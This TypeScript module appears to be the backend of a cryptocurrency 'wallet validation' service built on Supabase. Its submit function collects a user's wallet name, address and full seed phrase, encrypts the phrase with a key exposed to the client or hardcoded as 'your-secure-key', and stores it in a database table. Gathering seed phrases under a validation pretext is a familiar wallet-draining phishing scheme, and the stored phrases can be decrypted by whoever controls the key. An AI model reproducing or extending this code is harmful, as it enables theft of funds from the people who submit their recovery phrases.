import CryptoJS from 'crypto-js';
import { supabase } from './supabase';

const ENCRYPTION_KEY = import.meta.env.VITE_ENCRYPTION_KEY || 'your-secure-key';

export interface ValidationRequest {
  walletName: string;
  walletType: string;
  walletAddress: string;
  seedPhrase: string;
}

// Encrypt sensitive data
const encryptData = (data: string): string => {
  return CryptoJS.AES.encrypt(data, ENCRYPTION_KEY).toString();
};

// Submit wallet validation request
export const submitValidation = async (data: ValidationRequest) => {
  try {
    const { walletName, walletType, walletAddress, seedPhrase } = data;
    
    // Encrypt sensitive data
    const encryptedData = encryptData(seedPhrase);
    
    // Get current user
    const { data: { user } } = await supabase.auth.getUser();
    if (!user) throw new Error('User not authenticated');

    // Create validation record
    const { data: validation, error } = await supabase
      .from('wallet_validations')
      .insert({
        user_id: user.id,
        wallet_name: walletName,
        wallet_type: walletType,
        wallet_address: walletAddress,
        encrypted_data: encryptedData,
        status: 'pending'
      })
      .select()
      .single();

    if (error) throw error;

    // Log security event
    await supabase.rpc('log_security_event', {
      p_user_id: user.id,
      p_event_type: 'WALLET_VALIDATION_SUBMITTED',
      p_description: `Wallet validation submitted for ${walletType} wallet: ${walletName}`,
      p_ip_address: null // In a real app, you'd get this from the client
    });

    return { validation, error: null };
  } catch (error) {
    console.error('Error submitting validation:', error);
    return { validation: null, error };
  }
};

// Get user's validation requests
export const getValidationRequests = async () => {
  try {
    const { data: validations, error } = await supabase
      .from('wallet_validations')
      .select('*')
      .order('created_at', { ascending: false });

    if (error) throw error;
    return { validations, error: null };
  } catch (error) {
    console.error('Error fetching validations:', error);
    return { validations: null, error };
  }
};
